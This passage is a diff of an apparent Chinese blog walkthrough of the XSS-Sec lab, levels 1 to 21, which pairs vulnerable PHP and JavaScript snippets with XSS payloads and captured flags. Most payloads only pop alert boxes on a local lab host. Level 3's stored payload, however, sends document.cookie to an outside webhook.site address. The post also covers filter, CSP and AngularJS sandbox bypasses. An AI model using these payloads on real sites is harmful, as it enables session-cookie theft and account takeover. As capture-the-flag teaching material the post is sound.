@@ -6,11 +6,12 @@ date: '2026-11-11T10:21:41.654084+08:00'
 tags:
 - xss
 title: XSS-Sec 1-21
-updated: '2026-11-11T10:21:42.467+08:00'
+updated: '2026-11-11T10:39:20.323+08:00'
 ---
 ## 简介
 
 此为 https://github.com/duckpigdog/XSS-Sec/ 里面的题目，自行分析源码然后构造 payload，不过笔者感觉除了存储型 xss 以外，其他的例如反射性 xss，dom 型 xss，都没有太大的作用，因为都是只能弹本地的 cookie。
+
 ## Level 1: Reflected XSS
 
 源码：
@@ -38,11 +39,13 @@ if (empty($target_url)) {
 }
 ?>
 ```
+
 在下面那个 Report to admin 的框框里输入以下 payload：
 
 ```
 <script>alert(document.cookie)</script>
 ```
+
 ![image](https://img2.eval.moe/qexo/2026/11/edba8775ba50474702005ce8c93ed7dd.png)
 
 ## Level 2: DOM-based XSS
@@ -55,11 +58,13 @@ include '../headers.php';
 setcookie("flag", "flag{b1e49ef8-e15c-4e1e-b82f-04660ed96a98}", time() + 3600, "/", "", false, false);
 ?>
 ```
+
 payload:
 
 ```
 http://192.168.111.20/level2/index.php?keyword=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E
 ```
+
 ![image](https://img2.eval.moe/qexo/2026/11/a0bce28361e9efe606fa4f8862477e61.png)
 
 ## Level 3: Stored XSS
@@ -84,11 +89,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         exit;
     }...
 ```
+
 payload:
 
 ```javascript
 <script>fetch("https://webhook.site/352156e0-b618-4679-9064-67e3ee35c5f9?c="+document.cookie)</script>
 ```
+
 ![image](https://img2.eval.moe/qexo/2026/11/703027ae0e48ae8608a2d8cf161751d4.png)
 
 ## Level 4: Attribute Breakout
@@ -98,14 +105,17 @@ payload:
 ```
             <input type="text" name="keyword" value="<?php echo $keyword; ?>">
 ```
+
 payload:
 
 ```
 "+autofocus+onfocus%3D"alert%28document.cookie%29
 ```
+
 ```
 flag=flag%7B64145663-3bf8-49aa-a2ac-95a13ee84e96%7D
 ```
+
 ## Level 5: Filter Bypass
 
 源码：
@@ -114,26 +124,29 @@ flag=flag%7B64145663-3bf8-49aa-a2ac-95a13ee84e96%7D
             <?php
             if (isset($_GET['keyword'])) {
                 $str = $_GET['keyword'];
-              
+            
                 // Vulnerability: Simple blacklist filter
                 // Only <script> is banned, forcing the use of other tags/attributes
-              
+            
                 $str = str_ireplace("<script", "<scr_ipt", $str);
-              
+            
                 // on events are ALLOWED in this level to demonstrate alternate vectors
-              
+            
                 echo "Result: " . $str;
             }
             ?>
 ```
+
 payload:
 
 ```html
 <img src="x" onerror="alert(document.cookie)">
 ```
+
 ```
 flag=flag%7Bfb6abe6c-0278-4961-ad54-e8b28bd53eb9%7D
 ```
+
 ## Level 6: Quote Filtering
 
 源码：
@@ -147,14 +160,17 @@ flag=flag%7Bfb6abe6c-0278-4961-ad54-e8b28bd53eb9%7D
                 $keyword_safe = str_replace('"', '"', $keyword);
             ?>
 ```
+
 payload:
 
 ```
 'autofocus onfocus='alert(document.cookie)
 ```
+
 ```
 flag=flag%7B1b6a3fb2-1c77-407f-9695-450121751f7e%7D
 ```
+
 ## Level 7: Keyword Removal
 
 源码：
@@ -166,17 +182,20 @@ flag=flag%7B1b6a3fb2-1c77-407f-9695-450121751f7e%7D
                 }
                 $str = $_GET['keyword']; // Get original case
                 $str = str_ireplace($bad_words, '', $str); // Case-insensitive replace with empty string
-              
+            
                 echo "Result: <input value=\"" . $str . "\">";
 ```
+
 payload:
 
 ```
 " autofocus oonnfocus="alert(document.cookie)
 ```
+
 ```
 flag=flag%7B4fb8d6c8-7c1d-446c-8dd8-49a5f87d37e8%7D
 ```
+
 ## Level 8: Encoding Bypass
 
 源码：
@@ -197,22 +216,26 @@ flag=flag%7B4fb8d6c8-7c1d-446c-8dd8-49a5f87d37e8%7D
                 $str = str_replace("href", "hr_ef", $str);
                 $str = str_replace("javascript", "\"java_script\"", $str); // Break it with quotes
                 $str = str_replace('"', '"', $str); // Escape double quotes to prevent breakout
-              
+            
                 echo '<a href="' . $str . '">Your Link</a>';
 ```
+
 payload:
 
 ```
 javascript:alert(document.cookie)
 ```
+
 html 编码后：
 
 ```
 javascript:alert(document.cookie)
 ```
+
 ```
 flag=flag%7B8aa86ec1-58b4-44e0-b457-4ef5d05048bd%7D
 ```
+
 ## Level 9: URL Validation
 
 源码:
@@ -221,11 +244,11 @@ flag=flag%7B8aa86ec1-58b4-44e0-b457-4ef5d05048bd%7D
             <?php
             if (isset($_GET['keyword'])) {
                 $str = $_GET['keyword'];
-              
+            
                 // Security Check 1: Keyword Removal (replaces with empty string)
                 // Vulnerability: Only replaces once, allowing double write bypass.
                 $str = str_ireplace("script", "", $str); 
-              
+            
                 // Security Check 2: Must contain "http://"
                 if (strpos($str, 'http://') === false) {
                     echo '<p style="color:red;">Error: Invalid URL. Must contain http://</p>';
@@ -236,11 +259,13 @@ flag=flag%7B8aa86ec1-58b4-44e0-b457-4ef5d05048bd%7D
             }
             ?>
 ```
+
 payload:
 
 ```
 " autofocus onfocus="alert(document.cookie)" "http://x
 ```
+
 ## Level 10: Protocol Bypass
 
 源码:
@@ -248,17 +273,20 @@ payload:
 ```php
                 $str = str_replace("javascript", "", $str);
                 $str = str_replace("script", "", $str);
-              
+            
                 echo '<a href="' . $str . '">Your Link</a>';
 ```
+
 payload:
 
 ```
 JavaScript:(alert(document.cookie))
 ```
+
 ```
 flag=flag%7B2ffbdc31-a616-44d3-96a6-4681f714bb06%7D
 ```
+
 ## Level 11: JS Context
 
 源码:
@@ -268,23 +296,23 @@ flag=flag%7B2ffbdc31-a616-44d3-96a6-4681f714bb06%7D
             <?php
             if (isset($_GET['keyword'])) {
                 $str = $_GET['keyword'];
-              
+            
                 // Vulnerability: 
                 // Input is echoed directly into a JavaScript string variable.
                 // It is NOT encoded for JavaScript context (no json_encode).
                 // It might be htmlspecialchars() encoded, but that doesn't escape single quotes by default (unless ENT_QUOTES is set).
                 // Or simply, we just echo it.
-              
+            
                 // For this level, we simulate a common mistake: 
                 // Developer uses user input inside a JS string without escaping quotes.
-              
+            
                 // Context: var t_str = 'USER_INPUT';
                 // Goal: ';alert(1);//
-              
+            
                 // We deliberately DO NOT escape single quotes here.
                 // We only escape < and > to prevent direct tag injection, forcing the user to use JS context breakout.
                 $str_safe = str_replace(['<', '>'], ['<', '>'], $str);
-              
+            
                 echo "var t_str = '$str_safe';";
                 echo "\n            document.write('Current Search: ' + t_str);";
             } else {
@@ -293,6 +321,7 @@ flag=flag%7B2ffbdc31-a616-44d3-96a6-4681f714bb06%7D
             ?>
             </script>
 ```
+
 payload:
 
 ```
@@ -300,16 +329,18 @@ payload:
 或
 ';document.body.innerText=alert(document.cookie);//
 ```
+
 ```
 flag=flag%7B9b93b9f9-e9e2-4168-9871-4540c20c97a7%7D
 ```
+
 ## Level 12: SaaS Dashboard - CloudManage
 
 源码:
 
 ```php
             var tab = decodeURIComponent(hash.substring(1));
-          
+        
             // Update UI Active State
             menuLinks.forEach(link => {
                 link.classList.remove('active');
@@ -322,7 +353,7 @@ flag=flag%7B9b93b9f9-e9e2-4168-9871-4540c20c97a7%7D
             // Vulnerability: 
             // We reflect the tab name into the DOM while "loading".
             // If the tab doesn't exist, we show an error message that also reflects the input.
-          
+        
             container.innerHTML = '<div style="text-align:center; padding: 50px;">' +
                                   '<div class="loading-spinner"></div>' +
                                   '<p>Loading module: <strong>' + tab + '</strong>...</p>' + 
@@ -336,14 +367,17 @@ flag=flag%7B9b93b9f9-e9e2-4168-9871-4540c20c97a7%7D
                                           '</div>';
                 }
 ```
+
 payload:
 
 ```
 http://192.168.111.20/level12/#%3Cimg%20src=x%20onerror=alert(document.cookie)%3E
 ```
+
 ```
 flag=flag%7Blocation_hash_xss_level12%7D
 ```
+
 ## Level 13: Frontend Filter
 
 源码:
@@ -354,15 +388,15 @@ flag=flag%7Blocation_hash_xss_level12%7D
         <script>
             // Vulnerability: The filtering happens in the browser (Frontend)
             // It uses a Regex to check for malicious content.
-          
+        
             function processInput() {
                 const urlParams = new URLSearchParams(window.location.search);
                 const keyword = urlParams.get('keyword');
-              
+            
                 if (keyword) {
                     // Filter: Block <script> tags and 'javascript:' protocol
                     const blacklist = /<script|javascript:/i;
-                  
+                
                     if (blacklist.test(keyword)) {
                         document.getElementById('result').innerText = "馃毇 Malicious content detected!";
                         document.getElementById('result').style.color = "red";
@@ -373,18 +407,21 @@ flag=flag%7Blocation_hash_xss_level12%7D
                     }
                 }
             }
-          
+        
             processInput();
         </script>
 ```
+
 payload:
 
 ```
 <img src=x onerror=alert(document.cookie)>
 ```
+
 ```
 flag=flag%7Bff7321ad-67e8-4e92-b126-915f360c5e30%7D
 ```
+
 ## Level 14: Double Encoding
 
 源码:
@@ -396,51 +433,55 @@ flag=flag%7Bff7321ad-67e8-4e92-b126-915f360c5e30%7D
             <?php
             if (isset($_GET['keyword'])) {
                 $str = $_GET['keyword'];
-              
+            
                 // Security Check 1 (WAF Layer):
                 // We strictly forbid literal quotes and angle brackets.
                 // This happens AFTER the first automatic URL decode (by PHP $_GET).
                 // If user sends '%27', PHP sees "'".
                 // If user sends "'", PHP sees "'".
                 // Both are caught here.
-              
+            
                 if (preg_match("/['\"<>]/", $str)) {
                     // WAF Blocked: Sanitize dangerous chars
                     $str = str_replace(['\'', '"', '<', '>'], '_', $str);
                 }
-              
+            
                 // Vulnerability Implementation (Double Encoding Logic):
-              
+            
                 // 1. Backend Encoding
                 // The backend THEN proceeds to output the "cleaned" string into a JS variable.
                 $encoded = urlencode($str);
-              
+            
                 // 2. Frontend Logic
                 echo "\n            var rawInput = '$encoded';";
-              
+            
                 echo "\n            // Legacy System: Two rounds of decoding";
                 echo "\n            var step1 = decodeURIComponent(rawInput);";
                 echo "\n            var step2 = decodeURIComponent(step1);";
-              
+            
                 // Correct sink: We need to make sure the breakout syntax is valid.
                 echo "\n            setTimeout('console.log(\"Log: ' + step2 + '\")', 100);";
             }
             ?>
         </script>
 ```
+
 payload:
 
 ```
 ");alert(document.cookie);//
 ```
+
 url 编码两次后:
 
 ```
 %2522)%253Balert(document.cookie)%253B%252F%252F
 ```
+
 ```
 flag=flag%7Bc806ce06-d997-4871-a267-4f71f6872664%7D
 ```
+
 ## Level 15 - Angular/Framework XSS
 
 源码:
@@ -450,21 +491,21 @@ flag=flag%7Bc806ce06-d997-4871-a267-4f71f6872664%7D
             <?php
             if (isset($_GET['keyword'])) {
                 $str = $_GET['keyword'];
-              
+          
                 // Vulnerability: Outputting directly into an AngularJS template context
                 // If user inputs {{ 7 * 7 }}, Angular evaluates it.
                 // This is Client-Side Template Injection (CSTI).
-              
+          
                 // Also, "HTML -> JS -> HTML" logic:
                 // The server outputs HTML.
                 // Angular (JS) reads it as a template.
                 // Angular renders it back to HTML.
-              
+          
                 // We do htmlspecialchars to prevent "traditional" XSS (<script>)
                 // BUT we do NOT escape Angular template syntax {{ }}.
-              
+          
                 $safe_html = htmlspecialchars($str);
-              
+          
                 echo "<div id='result'>Hello, $safe_html</div>";
             }
             ?>
@@ -473,15 +514,22 @@ flag=flag%7Bc806ce06-d997-4871-a267-4f71f6872664%7D
             Angular Version: 1.8.2 <br>
         </div>
 ```
+
+{% raw %}
+
 ng-app 里的代码会被 Angular 当作模板编译执行，AngularJS 1.8.2 的表达式沙箱在 1.6+ 已基本移除（官方在 1.6 移除了沙箱，认为它不安全）。所以 {{ }} 里可以直接调用一些全局函数，不过我们要利用 \$eval 或构造函数进行逃逸。
 payload:
 
 ```
 {{constructor.constructor('alert(document.cookie)')()}}
 ```
+
 ```
 flag=flag%7Bd60d4d81-43f1-4a14-b909-c46cb3472c44%7D
 ```
+
+{% endraw %}
+
 ## Level 16: PostMessage XSS
 
 源码:
@@ -490,16 +538,16 @@ flag=flag%7Bd60d4d81-43f1-4a14-b909-c46cb3472c44%7D
             <?php
             if (isset($_GET['keyword'])) {
                 $str = $_GET['keyword'];
-              
+            
                 // Vulnerability: 
                 // 1. Input flows into iframe src.
                 // 2. "javascript" protocol is blocked to prevent direct XSS in iframe context.
                 // 3. User can use "data:" protocol.
                 // 4. "data:" iframe has Opaque Origin (null), so cannot access parent DOM directly.
                 // 5. BUT parent has a 'message' event listener that trusts data from iframes.
-              
+            
                 $str = str_ireplace("javascript", "", $str);
-              
+            
                 // We use htmlspecialchars to prevent breaking out of the src attribute.
                 // This forces the user to exploit the URL content itself.
                 echo '<iframe src="' . htmlspecialchars($str) . '" width="100%" height="100"></iframe>';
@@ -514,20 +562,23 @@ flag=flag%7Bd60d4d81-43f1-4a14-b909-c46cb3472c44%7D
             window.addEventListener('message', function(e) {
                 // In a real scenario, there should be an origin check here:
                 // if (e.origin !== "https://trusted.com") return;
-              
+            
                 console.log("Received message:", e.data);
                 document.getElementById('message-output').innerHTML = "Received: " + e.data;
             });
         </script>
 ```
+
 payload:
 
 ```
 data:text/html,<script>parent.postMessage('<img src=x onerror=alert(document.cookie)>', '*')</script>
 ```
+
 ```
 flag=flag%7Bcc24faef-8a6e-45a9-85d8-72db6e41a55c%7D
 ```
+
 ## Level 17: CSP Bypass
 
 CSP 是什么？
@@ -554,14 +605,17 @@ if (isset($_GET['callback'])) {
 // Strict CSP: Only allow scripts from 'self'. No inline scripts, no 'unsafe-inline'.
 header("Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';");
 ```
+
 payload:
 
 ```
 <script src=/level17/index.php?callback=alert(document.cookie)//></script>
 ```
+
 ```
 flag=flag%7B8d2a43e4-7157-4349-8cbe-192c3c3a08a1%7D
 ```
+
 ## Level 18: Understanding Stored XSS Vulnerabilities
 
 源码:
@@ -605,13 +659,13 @@ if (isset($_GET['clear'])) {
                     echo '<div class="comment-header">';
                     echo '<div class="avatar">' . $initial . '</div>';
                     echo '<div>';
-                  
+                
                     if (!empty($c['website'])) {
                         echo '<span class="author-name"><a href="' . $c['website'] . '">' . $c['author'] . '</a></span>';
                     } else {
                         echo '<span class="author-name">' . $c['author'] . '</span>';
                     }
-                  
+                
                     echo '<div class="comment-date">' . $c['time'] . '</div>';
                     echo '</div>'; // end div
                     echo '</div>'; // end header
@@ -623,12 +677,14 @@ if (isset($_GET['clear'])) {
             }
             ?>
 ```
+
 主要利用了 htmlspecialchars 不管协议的原理，所以只有 javascript 能绕过，payload:
 ![image](https://img2.eval.moe/qexo/2026/11/45b0e7c602e5261125ce36d1a8b30b2c.png)
 
 ```
 flag=flag%7B1a7b5cd7-f083-40c2-886c-3300609e0bf8%7D
 ```
+
 ## Level 19: Global Shop - Product Details
 
 源码:
@@ -636,19 +692,19 @@ flag=flag%7B1a7b5cd7-f083-40c2-886c-3300609e0bf8%7D
 ```php
                     <script>
                         var stores = ["London", "Paris", "Milan", "Tokyo", "New York", "Berlin"];
-                      
+                    
                         // Get storeId from URL
                         var store = (new URLSearchParams(window.location.search)).get('storeId');
-                      
+                    
                         document.write('<select name="storeId">');
-                      
+                    
                         // If a store is selected in URL, write it as the first option (selected)
                         if (store) {
                             document.write('<option selected>' + store + '</option>');
                         } else {
                              document.write('<option disabled selected>Select a city...</option>');
                         }
-                      
+                    
                         // List other stores
                         for (var i = 0; i < stores.length; i++) {
                             if (stores[i] === store) {
@@ -656,18 +712,21 @@ flag=flag%7B1a7b5cd7-f083-40c2-886c-3300609e0bf8%7D
                             }
                             document.write('<option>' + stores[i] + '</option>');
                         }
-                      
+                    
                         document.write('</select>');
                     </script>
 ```
+
 payload:
 
 ```
 	http://192.168.111.20/level19/?storeId=</select><img src=x onerror=alert(document.cookie)>
 ```
+
 ```
 flag=flag%7Bd2fea7d2-b235-4552-8391-7102eeb25ea6%7D
 ```
+
 ## Level 20: Customer Feedback - TechCorp
 
 源码:
@@ -678,10 +737,10 @@ flag=flag%7Bd2fea7d2-b235-4552-8391-7102eeb25ea6%7D
                 // Get the 'returnPath' parameter from the URL
                 var params = new URLSearchParams(window.location.search);
                 var returnPath = params.get('returnPath');
-              
+            
                 // If the auto-redirect script just ran, window.location.search might be updated in history but not DOM
                 // But new URLSearchParams(window.location.search) reads current location.
-              
+            
                 if (returnPath) {
                     // Vulnerable Code:
                     // Using jQuery's attr() to set href from untrusted source
@@ -689,7 +748,7 @@ flag=flag%7Bd2fea7d2-b235-4552-8391-7102eeb25ea6%7D
                     $('#backLink').attr('href', returnPath);
                 }
             });
-          
+        
             // Simple form handling (simulation)
             $('#feedbackForm').on('submit', function(e) {
                 e.preventDefault();
@@ -697,16 +756,19 @@ flag=flag%7Bd2fea7d2-b235-4552-8391-7102eeb25ea6%7D
             });
         </script>
 ```
+
 payload:
 
 ```
 http://192.168.111.20/level20/?returnPath=javascript:alert(document.cookie)
 ```
+
 然后点一下左下角的 Back to Home 拿到 flag
 
 ```
 flag=flag%7Bf86af6e9-4e9f-4088-8755-f227388b84d1%7D
 ```
+
 ## Level 21: JS String Reflection
 
 源码:
@@ -737,14 +799,17 @@ flag=flag%7Bf86af6e9-4e9f-4088-8755-f227388b84d1%7D
         console.log("Analytics sent for:", analyticsData.searchTerm);
     </script>
 ```
+
 htmlspecialchars() 的第二个参数为 ENT\_COMPAT 的时候，将不会转义单引号，payload:
 
 ```
 ',x: alert(document.cookie),//
 ```
+
 ```
 flag=flag%7B064b7412-4974-4053-ac90-8d5c3d1ba2a6%7D
 ```
+
 ## 拓展——HttpOnly 的作用
 
 当一个 Cookie 被标记为 HttpOnly 后：
